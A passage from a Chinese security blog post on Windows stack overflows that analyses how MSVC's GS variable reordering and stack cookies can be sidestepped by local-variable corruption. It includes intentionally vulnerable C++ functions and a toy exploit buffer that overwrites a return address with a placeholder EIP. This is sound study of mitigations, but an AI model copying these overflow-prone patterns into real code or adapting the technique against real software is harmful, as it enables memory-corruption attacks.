<p>这有可能是微软方面有意的配置，只是在上面的截图中被曲解了。由于SEHOP与第三方应用程序（如Skype和Cygwin）不兼容，因此，SEHOP在历史上一直被广泛禁用（微软在这里讨论了这个问题）。当SEHOP与本文中讨论的其他漏洞缓解措施一起正确启用时，在没有链式内存泄漏（任意读取）或任意写入原语的情况下，SEH劫持将无法用于利用栈溢出漏洞。任意读取原语可以允许NSEH字段在溢出前被泄漏，这样就可以制作溢出数据，以便在EIP劫持期间不破坏SEH链。通过任意写入原语（在下一节讨论），攻击者可以覆盖存储在栈上的返回地址或SEH handler，而不会破坏NSEH或栈金丝雀的值，从而绕过SEHOP和栈Cookie缓解措施。</p>
<h2 id="任意写入-amp-局部变量破坏"><a href="#任意写入-amp-局部变量破坏" class="headerlink" title="任意写入&amp;局部变量破坏"></a>任意写入&amp;局部变量破坏</h2><p>在某些情况下，攻击者根本就不需要溢出函数栈帧的末尾来触发EIP重定向。如果他们可以在不需要覆盖栈Cookie的情况下成功地获得代码执行权限，那么栈Cookie验证检查就可以轻松绕过。为此，有一种方法是使用栈溢出来破坏函数中的局部变量，以便让应用程序将我们选择的值写入我们选择的地址。下面的示例函数包含可以用这种方式利用的逻辑。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> gdwGlobalVar = <span class="number">0</span>; </span><br><span class="line">  <span class="type">void</span> Overflow（<span class="type">uint8_t</span>* pInputBuf， <span class="type">uint32_t</span> dwInputBufSize) &#123; </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    memcpy（Buf， pInputBuf， dwInputBufSize); </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>从根本上讲，我们要利用的是一个非常简单的代码模式：</p>
<ol>
<li>函数必须包含一个容易发生栈溢出的数组或结构。</li>
<li>该函数必须包含至少两个局部变量：一个解引用的指针和一个用于写入该指针的值。</li>
<li>函数必须使用局部变量写入解引用的指针，并在栈溢出发生后执行这个操作。</li>
<li>函数必须以这样的方式进行编译：即溢出的数组在栈上存储的位置比局部变量低。</li>
</ol>
<p>最后一点是一个值得进一步研究的问题。我们希望MSVC（Visual Studio 2019使用的编译器）以这样的方式编译图29中的代码：Buf的16个字节被放在分配给栈帧内存的最低区域（当包含栈Cookie时，应该是总共28个字节），然后是最高区域的dwVar1和pdwVar2。这个顺序与源代码中声明这些变量的顺序是一致的；这允许Buf向前溢出到更高的内存中，并用我们选择的值覆盖dwVar1和pdwVar2的值，从而使我们用于覆盖dwVar1的值被放在我们选择的内存地址上。然而在现实中，情况并非如此，编译器给出的汇编代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,1C </span><br><span class="line">mov eax,dword ptr ds:[&lt;___security_cookie&gt;] </span><br><span class="line">xor eax,ebp </span><br><span class="line">mov dword ptr ss:[ebp-4],eax </span><br><span class="line">mov dword ptr ss:[ebp-1C],1 </span><br><span class="line">mov dword ptr ss:[ebp-18], </span><br><span class="line">mov ecx,dword ptr ss:[ebp+C] </span><br><span class="line">push ecx </span><br><span class="line">mov edx,dword ptr ss:[ebp+8] </span><br><span class="line">push edx </span><br><span class="line">lea eax,dword ptr ss:[ebp-14] </span><br><span class="line">push eax </span><br><span class="line">call  </span><br><span class="line">add esp,C </span><br><span class="line">mov ecx,dword ptr ss:[ebp-18] </span><br><span class="line">mov edx,dword ptr ss:[ebp-1C] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">xor ecx,ebp </span><br><span class="line">call &lt;preciseoverwrite.@__security_check_cookie@4&gt; </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure>

<p>从上面的反汇编代码中我们可以看到，编译器已经在EBP-0x4和EBP-0x14之间的最高内存部分中选择了一个对应于Buf的区域，并且已经在EBP-0x1C和EBP-0x18的最低内存部分中分别为dwVar1和pdwVar2选择了一个区域。这种排序使易受攻击的函数免受局部变量通过栈溢出而损坏的影响。也许最有趣的是，dwVar1和pdwVar2的排序与它们在源代码中相对于Buf的声明顺序相矛盾。这最初让我觉得很不解，因为我认为MSVC会根据变量的声明顺序来排序，但进一步的测试证明事实并非如此。实际上，进一步的测试证明，MSVC并不是根据变量的声明、类型或名称的顺序来排序，而是根据它们在源代码中被引用（使用）次数来排序：引用次数多的变量将优先于那些引用次数少的变量。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint32_t</span> A; </span><br><span class="line">    <span class="type">uint32_t</span> B; </span><br><span class="line">    <span class="type">uint32_t</span> C; </span><br><span class="line">    <span class="type">uint32_t</span> D; </span><br><span class="line"> </span><br><span class="line">    B = <span class="number">2</span>; </span><br><span class="line">    A = <span class="number">1</span>; </span><br><span class="line">    D = <span class="number">4</span>; </span><br><span class="line">    C = <span class="number">3</span>; </span><br><span class="line">    C++; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>因此，我们可以预期这个函数的编译会按以下方式排列变量：C、B、A、D。这符合变量引用(使用)次数的顺序，而不是它们被声明的顺序。其中，C将被放在第一位(内存中最高地址处，距离EBP的偏移量最小)，因为它被引用了两次，而其他变量都只被引用了一次。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,10 </span><br><span class="line">mov dword ptr ss:[ebp-8],2 </span><br><span class="line">mov dword ptr ss:[ebp-C],1 </span><br><span class="line">mov dword ptr ss:[ebp-10],4 </span><br><span class="line">mov dword ptr ss:[ebp-4],3 </span><br><span class="line">mov eax,dword ptr ss:[ebp-4] </span><br><span class="line">add eax,1 </span><br><span class="line">mov dword ptr ss:[ebp-4],eax </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure>

<p>果然，我们可以看到，变量都已经按照我们预测的顺序排列，其中，C位于EBP – 4处，也就是排在第一位。尽管如此，MSVC使用的排序逻辑与我们在图30中看到的情况相矛盾。毕竟，dwVar1和pdwVar2的引用次数（各两次）都比Buf高（在memcpy中只有一次），而且都是在Buf之前引用的。那么这是怎么回事呢？GS包含了一个额外的安全缓解功能，它试图安全地对局部变量进行排序，以防止由于栈溢出而导致可利用的局部变量破坏。</p>
<p> 在GS机制下生成的具有安全变量顺序栈布局</p>
<p><img src="/.io//t01efae18697f164d60-1707050428584.png" alt="img"></p>
<p>绕过在项目设置中禁用GS，会产生以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov eax,dword ptr ss:[ebp+C] </span><br><span class="line">push eax </span><br><span class="line">mov ecx,dword ptr ss:[ebp+8] </span><br><span class="line">push ecx </span><br><span class="line">lea edx,dword ptr ss:[ebp-18] </span><br><span class="line">push edx </span><br><span class="line">call  </span><br><span class="line">add esp,C </span><br><span class="line">mov eax,dword ptr ss:[ebp-4] </span><br><span class="line">mov ecx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[eax],ecx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure>

<p>仔细对比上图34中的汇编代码和图30中的原始（安全）汇编代码，大家就会发现，从这个函数中删除的可不仅仅是栈Cookie检查。事实上，MSVC已经完全重新排列了栈上的变量，使其与正常规则一致，因此将Buf数组放在了内存的最低区域（EBP – 0x18）。因此，这个函数现在很容易通过栈溢出导致局部变量损坏。</p>
<p>在用多种不同的变量类型（包括其他数组类型）测试了同样的逻辑后，我得出如下结论：MSVC对数组和结构体（GS缓冲区）有一个特殊的规则，即总是将它们放在内存的最高区域，以防止编译后的函数的局部变量因栈溢出而遭到破坏。了解到这些信息后，我开始尝试评估这个安全机制的复杂程度，并设法通过边缘案例（edge cases）来绕过它。我发现了多个，下面是我认为最显著的例子。</p>
<p>首先，让我们来看看如果memcpy被移除会发生什么情况。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我们希望MSVC的安全排序规则总是将数组放置在内存的最高区域，以为函数提供安全保护，然而汇编代码表明，事情并非如此。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">xor eax,eax </span><br><span class="line">mov dword ptr ss:[ebp-18],eax </span><br><span class="line">mov dword ptr ss:[ebp-14],eax </span><br><span class="line">mov dword ptr ss:[ebp-10],eax </span><br><span class="line">mov dword ptr ss:[ebp-C],eax </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">mov edx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure>

<p>如您所见，MSVC已经从函数中删除了栈Cookie。同时，MSVC还将Buf数组放在了内存的最低区域，这违背了其典型的安全策略；如果缓冲区未被引用，它将不考虑GS缓冲区的安全重排序规则。这样就提出了一个有趣的问题：何谓引用？令人惊讶的是，答案并不像我们所期望的那样（引用就是函数中对变量的任何使用）。针对某些类型的变量使用并不能算作引用，因此不会影响变量的排序。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>]&#125;; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    Buf[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>; </span><br><span class="line">    Buf[<span class="number">1</span>] = <span class="string">&#x27;B&#x27;</span>; </span><br><span class="line">    Buf[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>; </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我们希望Buf被放置在内存的第一个（最高）槽（slot）中，因为它被引用了三次，而dwVar1和pdwVar2各只被引用了两次。这个函数的汇编代码与此相矛盾。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov eax,1 </span><br><span class="line">imul ecx,eax,0 </span><br><span class="line">mov byte ptr ss:[ebp+ecx-18],41 </span><br><span class="line">mov edx,1 </span><br><span class="line">shl edx,0 </span><br><span class="line">mov byte ptr ss:[ebp+edx-18],42 </span><br><span class="line">mov eax,1 </span><br><span class="line">shl eax,1 </span><br><span class="line">mov byte ptr ss:[ebp+eax-18],43 </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">mov edx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure>

<p>尽管Buf是一个数组，而且比其他任何一个局部变量使用得更多，但是，它却被保存在栈内存的最低处EBP–0x18。上面的汇编代码的另一个有趣的细节是，MSVC没有给上面的函数添加安全Cookie检查。这就意味着，该返回地址仍会受到经典栈溢出以及任意写入漏洞的影响。</p>
<p>越界写入漏洞</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint8_t</span> Exploit[] = </span><br><span class="line">    <span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span>  <span class="comment">// 16 bytes for buffer length </span></span><br><span class="line">    <span class="string">&quot;\xde\xc0\xad\xde&quot;</span>  <span class="comment">// New EIP 0xdeadc0de </span></span><br><span class="line">    <span class="string">&quot;\x1c\xff\x19\x00&quot;</span>; <span class="comment">// 0x0019FF1c </span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> gdwGlobalVar = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowOOBW</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> dwX = <span class="number">0</span>; dwX &lt; dwInputBufSize; dwX++) &#123; </span><br><span class="line">    Buf[dwX] = pInputBuf[dwX]; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>编译并执行上面的代码会导致一个没有栈Cookies和没有进行安全的变量排序的函数，这样的话，攻击者就可以通过精确覆盖0x0019FF1c处的返回地址来劫持EIP（在本例中，我已经禁用了ASLR）。</p>
<p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture47.png" alt="img"></p>
<p>根据这些实验，我们可以得出如下所示的结论：</p>
<ol>
<li>MSVC中存在一个安全漏洞：错误地评估了一个函数对栈溢出攻击的潜在敏感性。</li>
<li>这个安全漏洞源于MSVC使用某种形式的内部引用次数来决定变量顺序，而当一个变量的引用次数为零时，它被排除在常规的安全排序和栈Cookie安全缓解措施之外（即使它是一个GS缓冲区）。</li>
<li>按索引读&#x2F;写数组不计入引用次数。因此，以这种方式访问数组的函数将缺乏针对栈溢出漏洞的保护。</li>
</ol>
<p>对于可能无法适当防止栈溢出的代码模式，我还有几个其他的想法，首先是结构体&#x2F;类的概念。虽然函数栈帧内的变量排序没有标准化或约定俗成（完全由编译器决定），但对于结构体来说，情况就不一样了；编译器必须精确地遵循源代码中声明变量的顺序。因此，如果一个结构体中包含一个数组，后面还有额外的变量，这些变量就无法安全地重新排序，因此，可能会因溢出而被破坏。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MyStruct</span> &#123; </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1; </span><br><span class="line">    <span class="type">uint32_t</span> *pdwVar2; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowStruct</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">MyStruct</span> TestStruct = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">    TestStruct.dwVar1 = <span class="number">1</span>; </span><br><span class="line">    TestStruct.pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="built_in">memcpy</span>(TestStruct.Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *TestStruct.pdwVar2 = TestStruct.dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>上面用于结构体的概念同样也适用于C++类，前提是它们被声明为局部变量并在栈上分配内存空间。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123; </span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowClass</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    MyClass TestClass; </span><br><span class="line">    TestClass.dwVar1 = <span class="number">1</span>; </span><br><span class="line">    TestClass.pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="built_in">memcpy</span>(TestClass.Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *TestClass.pdwVar2 = TestClass.dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>当涉及到类时，一个额外的攻击手法是破坏其vtable指针。这些vtable包含指向可执行代码的其他指针，这些可执行代码可以在RET指令之前通过被破坏的类的方法进行调用，从而提供了一种通过破坏局部变量来劫持EIP的新方法，而无需使用任意写入原语。</p>
<p>最后一个容易被局部变量破坏的代码模式的例子是使用运行时栈分配函数，如_alloca。由于这类函数的内存分配过程，是在函数的栈帧已经建立后，通过减去ESP来实现的，因此，这类函数分配的内存将始终处于较低的栈内存中，所以无法重新排序或免受此类攻击的威胁。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowAlloca</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="type">uint32_t</span> dwValue = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pgdwGlobalVar = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="type">char</span>* Buf = (<span class="type">char</span>*)_alloca(<span class="number">16</span>); </span><br><span class="line">    <span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *pgdwGlobalVar = dwValue; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>请注意，尽管上面的函数中没有数组，但MSVC足够聪明，它知道只要使用了_alloca函数就有必要在生成的函数代码中放入栈Cookie。</p>
<p>这里讨论的技术代表了一种现代Windows的栈溢出的攻击面，到目前为止，还没有明确的安全缓解措施。然而，它们的可靠利用依赖于这里讨论的特定代码模式以及（在任意写入的情况下）一个链式内存泄漏原语。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>对于栈溢出漏洞，虽然现代的操作系统已经提供了许多防御机制，但在今天的Windows应用程序中仍然存在并且可被利用。如果存在非Safeseh模块，那么利用这种溢出漏洞就比较容易，因为还没有哪种默认的安全缓解机制强大到可以防止局部变量破坏而导致的任意写入攻击。就目前来说，防御这类攻击的最强机制是ASLR，为了绕过这种机制，攻击者需要借助于非ASLR模块或内存泄漏漏洞。正如我们在这篇文章中所展示的那样，非Safeseh模块和非ASLR模块在如今的Windows 10系统以及许多第三方应用程序中仍不乏足迹。</p>
<p>与过去相比，尽管栈溢出漏洞的利用技术变得愈加复杂，但与堆中的其他内存破坏类型的漏洞相比，栈溢出是最容易理解的一个。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://qianmuoy.github.io">qianmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://qianmuoy.github.io/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/">https://qianmuoy.github.io/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/04/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/" title="基于深度学习的端到端自动驾驶"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">基于深度学习的端到端自动驾驶</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/01/MD5/" title="MD5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">MD5</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">qianmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/QianMuOY"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">Windows栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.</span> <span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0shellcode"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">本地shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8Bshellcode"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">远程shellcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.</span> <span class="toc-text">经典栈溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88Cookie%E3%80%81GS%E4%B8%8EGS"><span class="toc-number">1.4.</span> <span class="toc-text">栈Cookie、GS与GS++</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.</span> <span class="toc-text">SSH劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEP-amp-ASLR"><span class="toc-number">1.6.</span> <span class="toc-text">DEP &amp; ASLR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 